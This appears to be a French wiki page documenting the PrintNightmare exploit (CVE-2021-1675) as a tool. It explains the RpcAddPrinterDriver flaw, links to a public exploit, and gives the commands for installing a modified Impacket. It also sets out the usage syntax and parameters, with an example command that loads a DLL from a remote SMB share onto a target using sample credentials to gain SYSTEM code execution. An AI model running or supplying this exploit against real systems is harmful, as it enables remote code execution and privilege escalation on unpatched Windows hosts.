---
title: PrintNightmare
description: Permet à n'importe quel utilisateur sans le privilège SeLoadDriverPrivilege, d'ajouter des drivers d'impression à un système local ou distant, et par conséquent d'exécuter du code en tant que NT AUTHORITY\SYSTEM.
published: true
date: 2024-08-25T12:47:26.370Z
tags: outil, windows
editor: markdown
dateCreated: 2024-08-23T14:57:38.073Z
---

# Introduction

PrintNightmare est un exploit qui utilise une faille dans la fonction RpcAddPrinterDriver, qui permet à n'importe quel utilisateur sans le privilège SeLoadDriverPrivilege, d'ajouter des drivers d'impression à un système local ou distant, et par conséquent d'exécuter du code en tant que NT AUTHORITY\SYSTEM.

> La fonction RpcAddPrinterDriver permet aux utilisateurs avec le privilège SeLoadDriverPrivilege d'ajouter des drivers sur des spouleurs distants.
> {.is-info}

> PrintNightmare est disponible au téléchargement [ici](https://github.com/cube0x0/CVE-2021-1675)
> {.is-info}

> Le canal nommé \pipe\spoolss est utilisé pour la communication.
> {.is-info}

# Installation

Cet exploit nécéssite une version de Impacket modifiée.

`pip3 uninstall impacket`
`git clone https://github.com/cube0x0/impacket`
`cd impacket`
`python3 ./setup.py install`

# Syntaxe

`CVE-2021-1675.py [[domaine/]utilisateur[:mot de passe]@]<nom ou adresse de la cible> <chemin du fichier DLL> [paramètres]`

# Paramètres

| Paramètre                    | Description                                                                       |
| ---------------------------- | --------------------------------------------------------------------------------- | -------------------------- |
| `-h                          | --help`                                                                           | Affiche le message d'aide. |
| `-hashes <LMHASH>:<NTHASH> ` | Spécifie les hashes NTLM pour l'authentification.                                 |
| `-target-ip [adresse]`       | Spécifie l'adresse de la cible (utile si le nom Netbios est utilisé comme cible). |
| `-port <port> `              | Spécifie le port de destination pour la connexion au serveur SMB.                 |

# Exemples

Ajoute le driver situé sur le partage SMB "\\192.168.1.2\smb\addCube.dll" sur le système 192.168.1.1 avec comme utilisateur domain.local/paul et mot de passe "t00r".
`CVE-2021-1675.py domain.local/paul:t00r@192.168.1.1 '\\192.168.1.2\smb\addCube.dll'`

# Voir aussi

Fonction RpcAddPrinterDriver:
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22

Emplacement et informations concernant le canal nommé \pipe\spoolss:
https://learn.microsoft.com/fr-fr/openspecs/windows_protocols/ms-rprn/fdf1138a-f6b9-4b00-ada6-1fbb6097d683
